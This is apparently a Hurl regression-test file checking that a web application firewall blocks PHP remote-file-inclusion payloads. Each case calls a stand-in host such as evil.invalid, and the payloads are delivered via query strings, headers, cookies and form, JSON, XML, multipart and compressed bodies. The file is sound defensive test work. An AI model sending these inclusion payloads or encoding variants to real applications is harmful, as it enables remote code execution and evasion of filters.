# rfi regression cases
# Set base_url to an authorized test WAF (no trailing slash).
# The upstream root must return 200 for before/after controls.
# Use --continue-on-error --path-as-is --jobs 1.

# rfi-01--query | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-01--query-before
HTTP 200

GET {{base_url}}/probe?q=require_once(https%3A%2F%2Fevil.invalid%2Fp.php)
X-Hurl-Case: rfi-01--query
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-01--query-after
HTTP 200


# rfi-01--query-double | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-01--query-double-before
HTTP 200

GET {{base_url}}/probe?q=require_once(https%253A%252F%252Fevil.invalid%252Fp.php)
X-Hurl-Case: rfi-01--query-double
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-01--query-double-after
HTTP 200


# rfi-01--query-duplicate | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-01--query-duplicate-before
HTTP 200

GET {{base_url}}/probe?q=normal&q=require_once(https%3A%2F%2Fevil.invalid%2Fp.php)
X-Hurl-Case: rfi-01--query-duplicate
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-01--query-duplicate-after
HTTP 200


# rfi-01--header | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-01--header-before
HTTP 200

GET {{base_url}}/probe
X-Hurl-Case: rfi-01--header
X-Probe: require_once(https%3A%2F%2Fevil.invalid%2Fp.php)
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-01--header-after
HTTP 200


# rfi-01--cookie | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-01--cookie-before
HTTP 200

GET {{base_url}}/probe
X-Hurl-Case: rfi-01--cookie
Cookie: probe=require_once(https%3A%2F%2Fevil.invalid%2Fp.php)
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-01--cookie-after
HTTP 200


# rfi-01--form | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-01--form-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: rfi-01--form
Content-Type: application/x-www-form-urlencoded
```
q=require_once(https%3A%2F%2Fevil.invalid%2Fp.php)
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-01--form-after
HTTP 200


# rfi-01--json | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-01--json-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: rfi-01--json
Content-Type: application/json
```
{"data":{"values":["normal","require_once(https://evil.invalid/p.php)"]}}
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-01--json-after
HTTP 200


# rfi-01--json-put | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-01--json-put-before
HTTP 200

PUT {{base_url}}/probe
X-Hurl-Case: rfi-01--json-put
Content-Type: application/json
```
{"data":{"values":["normal","require_once(https://evil.invalid/p.php)"]}}
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-01--json-put-after
HTTP 200


# rfi-01--json-patch | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-01--json-patch-before
HTTP 200

PATCH {{base_url}}/probe
X-Hurl-Case: rfi-01--json-patch
Content-Type: application/json
```
{"data":{"values":["normal","require_once(https://evil.invalid/p.php)"]}}
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-01--json-patch-after
HTTP 200


# rfi-01--text | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-01--text-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: rfi-01--text
Content-Type: text/plain
```
require_once(https://evil.invalid/p.php)
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-01--text-after
HTTP 200


# rfi-01--xml | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-01--xml-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: rfi-01--xml
Content-Type: application/xml
```
<root><value>require_once(https://evil.invalid/p.php)</value></root>
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-01--xml-after
HTTP 200


# rfi-01--multipart | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-01--multipart-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: rfi-01--multipart
Content-Type: multipart/form-data; boundary=HurlBoundary
base64,LS1IdXJsQm91bmRhcnkNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0icSINCg0KcmVxdWlyZV9vbmNlKGh0dHBzOi8vZXZpbC5pbnZhbGlkL3AucGhwKQ0KLS1IdXJsQm91bmRhcnktLQ0K;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-01--multipart-after
HTTP 200


# rfi-01--gzip | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-01--gzip-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: rfi-01--gzip
Content-Type: application/json
Content-Encoding: gzip
base64,H4sIAAAAAAAACgXBTQqAIBAG0Lt8q4LQvVeJiCEHHJjU/NuId++9CU+N4CYGaecKdyKm8pLiQOGvS+E7xYe30FquzloeokbiIBVvs8kh77jW+gFo4NXGSQAAAA==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-01--gzip-after
HTTP 200


# rfi-01--deflate | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-01--deflate-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: rfi-01--deflate
Content-Type: application/json
Content-Encoding: deflate
base64,eJwFwU0KgCAQBtC7fKuC0L1XiYghBxyY1PzbiHfvvQlPjeAmBmnnCncipvKS4kDhr0vhO8WHt9Bars5aHqJG4iAVb7PJIe+41voBtzEaAw==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-01--deflate-after
HTTP 200


# rfi-01--br | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-01--br-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: rfi-01--br
Content-Type: application/json
Content-Encoding: br
base64,G0gAABwJdkzHOoLwOBDI5lJf0qIxiJgMwjlPLxaLTvTBBhy4j/k2rQvtMXaGUpA+FhAuImHANsinMnpy1nT7z7G5deFvF1US;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-01--br-after
HTTP 200


# rfi-bypass-01--query | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--query-before
HTTP 200

GET {{base_url}}/probe?q=Include(https%3A%2F%2Fexample.invalid%2Fa.php)
X-Hurl-Case: rfi-bypass-01--query
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--query-after
HTTP 200


# rfi-bypass-01--query-double | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--query-double-before
HTTP 200

GET {{base_url}}/probe?q=Include(https%253A%252F%252Fexample.invalid%252Fa.php)
X-Hurl-Case: rfi-bypass-01--query-double
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--query-double-after
HTTP 200


# rfi-bypass-01--query-duplicate | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--query-duplicate-before
HTTP 200

GET {{base_url}}/probe?q=normal&q=Include(https%3A%2F%2Fexample.invalid%2Fa.php)
X-Hurl-Case: rfi-bypass-01--query-duplicate
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--query-duplicate-after
HTTP 200


# rfi-bypass-01--header | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--header-before
HTTP 200

GET {{base_url}}/probe
X-Hurl-Case: rfi-bypass-01--header
X-Probe: Include(https%3A%2F%2Fexample.invalid%2Fa.php)
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--header-after
HTTP 200


# rfi-bypass-01--cookie | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--cookie-before
HTTP 200

GET {{base_url}}/probe
X-Hurl-Case: rfi-bypass-01--cookie
Cookie: probe=Include(https%3A%2F%2Fexample.invalid%2Fa.php)
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--cookie-after
HTTP 200


# rfi-bypass-01--form | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--form-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: rfi-bypass-01--form
Content-Type: application/x-www-form-urlencoded
```
q=Include(https%3A%2F%2Fexample.invalid%2Fa.php)
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--form-after
HTTP 200


# rfi-bypass-01--json | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--json-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: rfi-bypass-01--json
Content-Type: application/json
```
{"data":{"values":["normal","Include(https://example.invalid/a.php)"]}}
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--json-after
HTTP 200


# rfi-bypass-01--json-put | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--json-put-before
HTTP 200

PUT {{base_url}}/probe
X-Hurl-Case: rfi-bypass-01--json-put
Content-Type: application/json
```
{"data":{"values":["normal","Include(https://example.invalid/a.php)"]}}
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--json-put-after
HTTP 200


# rfi-bypass-01--json-patch | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--json-patch-before
HTTP 200

PATCH {{base_url}}/probe
X-Hurl-Case: rfi-bypass-01--json-patch
Content-Type: application/json
```
{"data":{"values":["normal","Include(https://example.invalid/a.php)"]}}
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--json-patch-after
HTTP 200


# rfi-bypass-01--text | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--text-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: rfi-bypass-01--text
Content-Type: text/plain
```
Include(https://example.invalid/a.php)
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--text-after
HTTP 200


# rfi-bypass-01--xml | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--xml-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: rfi-bypass-01--xml
Content-Type: application/xml
```
<root><value>Include(https://example.invalid/a.php)</value></root>
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--xml-after
HTTP 200


# rfi-bypass-01--multipart | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--multipart-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: rfi-bypass-01--multipart
Content-Type: multipart/form-data; boundary=HurlBoundary
base64,LS1IdXJsQm91bmRhcnkNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0icSINCg0KSW5jbHVkZShodHRwczovL2V4YW1wbGUuaW52YWxpZC9hLnBocCkNCi0tSHVybEJvdW5kYXJ5LS0NCg==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--multipart-after
HTTP 200


# rfi-bypass-01--gzip | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--gzip-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: rfi-bypass-01--gzip
Content-Type: application/json
Content-Encoding: gzip
base64,H4sIAAAAAAAACqtWSkksSVSyqlYqS8wpTS1WsopWyssvyk3MUdJR8sxLzilNSdXIKCkpKLbS10+tSMwtyEnVy8wrS8zJTNFP1CvIKNBUiq2tBQCR0DG+RwAAAA==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--gzip-after
HTTP 200


# rfi-bypass-01--deflate | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--deflate-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: rfi-bypass-01--deflate
Content-Type: application/json
Content-Encoding: deflate
base64,eJyrVkpJLElUsqpWKkvMKU0tVrKKVsrLL8pNzFHSUfLMS84pTUnVyCgpKSi20tdPrUjMLchJ1cvMK0vMyUzRT9QryCjQVIqtrQUAdasY8w==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--deflate-after
HTTP 200


# rfi-bypass-01--br | 远程文件包含 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--br-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: rfi-bypass-01--br
Content-Type: application/json
Content-Encoding: br
base64,G0YASCwO7IbPz/GGhhOZHfxrkb0tl9UVViw62eeWliIpL+CQA6dAri2LEgs24MS2ZVoSHCdSE6lnBz/E3aapAHhdi6NYAA==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: rfi-bypass-01--br-after
HTTP 200


